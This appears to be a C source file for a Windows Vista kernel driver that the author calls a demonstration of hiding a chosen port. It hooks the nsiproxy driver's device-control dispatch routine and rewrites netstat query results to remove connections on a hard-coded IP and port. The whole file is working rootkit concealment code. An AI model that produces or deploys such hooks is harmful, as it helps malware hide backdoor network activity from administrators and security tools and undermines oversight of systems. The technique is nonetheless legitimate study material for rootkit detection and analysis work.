///////////////////////////////////////////////////////////////////////////////////////
// Filename: PortHidDemo_Vista.c
// 
// Author: CardMagic(Edward)
// Email: sunmy1@sina.com
// MSN:  onlyonejazz at hotmail.com
//
// Description: 
//			A Demostration Of Hiding
//   		Specified Port Under Windows Vista RTM 32bit.
//      Tested Under Windows Vista Kernel Version 6000 MP (1 procs) Free x86 compatible
//
// 

#include "stdlib.h"
#include "ntifs.h"

unsigned short htons(unsigned short hostshort);
unsigned long  inet_addr(const char *name);
typedef unsigned long DWORD;


#define LOCALHIDEIP "10.28.157.71"
#define LOCALHIDEPORT 139


#define IOCTL_NSI_GETALLPARAM 0x12001B

extern POBJECT_TYPE *IoDeviceObjectType,*IoDriverObjectType;
PDRIVER_OBJECT pNsiDrvObj = 0;
PDRIVER_DISPATCH orgNsiDeviceIoControl = 0;


DWORD gLocalPort=0,gLocalIp=0;

typedef struct _HP_CONTEXT
{
	PIO_COMPLETION_ROUTINE oldIocomplete;
	PVOID oldCtx;	
	BOOLEAN bShouldInvolve;
	PKPROCESS pcb;
}HP_CONTEXT,*PHP_CONTEXT;

typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
{
	char bytesfill0[2];
	USHORT Port;
	DWORD dwIP;
	char bytesfill[20];

}INTERNAL_TCP_TABLE_SUBENTRY,*PINTERNAL_TCP_TABLE_SUBENTRY;

typedef struct _INTERNAL_TCP_TABLE_ENTRY
{
	INTERNAL_TCP_TABLE_SUBENTRY localEntry;
	INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
	
}INTERNAL_TCP_TABLE_ENTRY,*PINTERNAL_TCP_TABLE_ENTRY;

typedef struct _NSI_STATUS_ENTRY
{
	char bytesfill[12]; 

}NSI_STATUS_ENTRY,*PNSI_STATUS_ENTRY;

typedef struct _NSI_PARAM
{
	//
	// Total 3CH size
	//
	DWORD UnknownParam1;
	DWORD UnknownParam2;
	DWORD UnknownParam3;
	DWORD UnknownParam4;
	DWORD UnknownParam5;
	DWORD UnknownParam6;
	PVOID lpMem;
	DWORD UnknownParam8;
	DWORD UnknownParam9;
	DWORD UnknownParam10;
	PNSI_STATUS_ENTRY lpStatus;
	DWORD UnknownParam12;
	DWORD UnknownParam13;
	DWORD UnknownParam14;
	DWORD TcpConnCount;


}NSI_PARAM,*PNSI_PARAM;



unsigned short htons(unsigned short a)
{
	unsigned short b = a;
	b = ( b << 8 );
	a = ( a >> 8 );
	return ( a | b );
};

unsigned long inet_addrt(const char* name)
{
	int i,j,p;
	int len = strlen(name);
	unsigned long temp_val[4];
	char namesec[10] ;

	for(i = 0,j =0,p =0;i < len;i++)
	{
		memset(namesec,0,10);
		if('.' == name[i])
		{

			if(p)
				strncpy(namesec,name+p+1,i-p);
			else
				strncpy(namesec,name,i);
			temp_val[j] = atoi(namesec);
			j++;
			p = i;
		}
	}

	strncpy(namesec,name+p+1,i-p);
	temp_val[j] = atoi(namesec);


	return (temp_val[0]|(temp_val[1]<<8)|(temp_val[2]<<16)|(temp_val[3]<<24));
}



NTSTATUS
HPCompletion(
			 IN PDEVICE_OBJECT  DeviceObject,
			 IN PIRP  Irp,
			 IN PVOID  Context
			 )
{
	PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);
	PIO_STACK_LOCATION irpspNext = IoGetNextIrpStackLocation(Irp);
	PHP_CONTEXT pCtx = Context;
	PNSI_PARAM nsiParam;
	int i;
	

	if(NT_SUCCESS(Irp->IoStatus.Status))
	{

		nsiParam = Irp->UserBuffer;
		if(MmIsAddressValid(nsiParam->lpMem))
		{
			//
			// netstat will involve internal calls which will use 
			// nsiParam structure
			//
			if(	(nsiParam->UnknownParam8 == 0x38))
			{
				KAPC_STATE apcstate;
				PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)nsiParam->lpStatus;
				PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)nsiParam->lpMem;
				int nItemCnt = nsiParam->TcpConnCount;
				

				KeStackAttachProcess(pCtx->pcb,&apcstate);
				
				//
				//make sure we are in the context of original process
				//
				for(i = 0;i < nItemCnt;i ++)
				{

					if((pTcpEntry[i].localEntry.dwIP == gLocalIp)&&(pTcpEntry[i].localEntry.Port == gLocalPort))
					{
						//
						//NSI will map status array entry to tcp table array entry
						//we must modify both synchronously
						//
						RtlCopyMemory(&pTcpEntry[i],&pTcpEntry[i+1],sizeof(INTERNAL_TCP_TABLE_ENTRY)*(nItemCnt-i));
						RtlCopyMemory(&pStatusEntry[i],&pStatusEntry[i+1],sizeof(NSI_STATUS_ENTRY)*(nItemCnt-i));
						nItemCnt--;
						nsiParam->TcpConnCount --;
						i--;
						

						
					}
				}

				KeUnstackDetachProcess(&apcstate);
				
			}


		}
		
	}

	irpspNext->Context = pCtx->oldCtx;
	irpspNext->CompletionRoutine = pCtx->oldIocomplete;
	
	//
	//free the fake context
	//
	ExFreePool(Context);



	if(pCtx->bShouldInvolve)
		return irpspNext->CompletionRoutine(DeviceObject,Irp,Context);
	else
	{
		if (Irp->PendingReturned) {
			IoMarkIrpPending(Irp);
		}
		return STATUS_SUCCESS;
	}
	

}



NTSTATUS
ObReferenceObjectByName (
						 IN PUNICODE_STRING ObjectName,
						 IN ULONG Attributes,
						 IN PACCESS_STATE AccessState OPTIONAL,
						 IN ACCESS_MASK DesiredAccess OPTIONAL,
						 IN POBJECT_TYPE ObjectType,
						 IN KPROCESSOR_MODE AccessMode,
						 IN OUT PVOID ParseContext OPTIONAL,
						 OUT PVOID *Object
						 );


NTSTATUS HPUnload(IN PDRIVER_OBJECT DriverObject)
{
	LARGE_INTEGER waittime;

	waittime.QuadPart = -50*1000*1000;
	InterlockedExchange(&(pNsiDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL]), orgNsiDeviceIoControl);

	//
	//delay loading driver to make it more secure
	//
	KeDelayExecutionThread(KernelMode,0,&waittime);

	return STATUS_SUCCESS;
}
   
NTSTATUS HPDummyDeviceIoControl( 
								IN PDEVICE_OBJECT  DeviceObject,
								IN PIRP  Irp
								)
{
	ULONG         ioControlCode;
	PIO_STACK_LOCATION irpStack;
	ULONG		  status;

	irpStack = IoGetCurrentIrpStackLocation(Irp);

	ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	if(IOCTL_NSI_GETALLPARAM == ioControlCode)
	{
		if(irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			//
			//only care the related I/O
			//
			PHP_CONTEXT ctx = (HP_CONTEXT*)ExAllocatePool(NonPagedPool,sizeof(HP_CONTEXT));
			ctx->oldIocomplete = irpStack->CompletionRoutine;
			ctx->oldCtx = irpStack->Context;
			irpStack->CompletionRoutine = HPCompletion;
			irpStack->Context = ctx;
			ctx->pcb = IoGetCurrentProcess();

			if((irpStack->Control&SL_INVOKE_ON_SUCCESS) ==SL_INVOKE_ON_SUCCESS)
				ctx->bShouldInvolve = TRUE;
			else
				ctx->bShouldInvolve = FALSE;
			irpStack->Control |= SL_INVOKE_ON_SUCCESS;

				
		}



	}

	//
	//call original I/O control routine
	//
	status =  orgNsiDeviceIoControl(DeviceObject,Irp);

	return status;


}


NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	

	int i;
	NTSTATUS status;
	UNICODE_STRING uniNsiDrvName;
	

#if DBG
		_asm int 3 //debug
#endif

	DriverObject->DriverUnload = HPUnload;

	RtlInitUnicodeString(&uniNsiDrvName,L"\\Driver\\nsiproxy");

	status = ObReferenceObjectByName(&uniNsiDrvName,OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,&pNsiDrvObj);

	if(!NT_SUCCESS(status))
	{
		return STATUS_SUCCESS;
		
	}


	//
	//store the original dispatch function of NSI driver
	//
	orgNsiDeviceIoControl = pNsiDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
	

	gLocalIp = inet_addrt(LOCALHIDEIP);
	gLocalPort = htons(LOCALHIDEPORT);

	//
	//hook NSI dispatch routine
	//
	InterlockedExchange(&(pNsiDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL]), HPDummyDeviceIoControl);

	return STATUS_SUCCESS;
}





